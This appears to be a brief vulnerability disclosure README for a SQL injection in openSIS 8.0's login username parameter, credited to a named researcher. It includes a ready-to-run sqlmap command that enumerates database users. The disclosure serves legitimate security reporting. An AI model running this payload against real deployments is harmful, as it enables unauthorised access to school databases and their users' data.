# opensis-SQLInjection1

A SQL Injection vulnerability exists in version 8.0 of openSIS when MySQL is being used as the application database. A malicious attacker can issue SDL commands to the Mysql database through the vulnerable username parameter. 

Vulnerable PHP Page:

index.php - username parameter

Vulnerable Payload

sqlmap "http://localhost:8081/index.php" --users --data="USERNAME=admin&PASSWORD=test1234%21&language=en&log=" --dbms="MySQL" --level=3 --risk=2 

Discovered by Nathan Johnson, August 2021
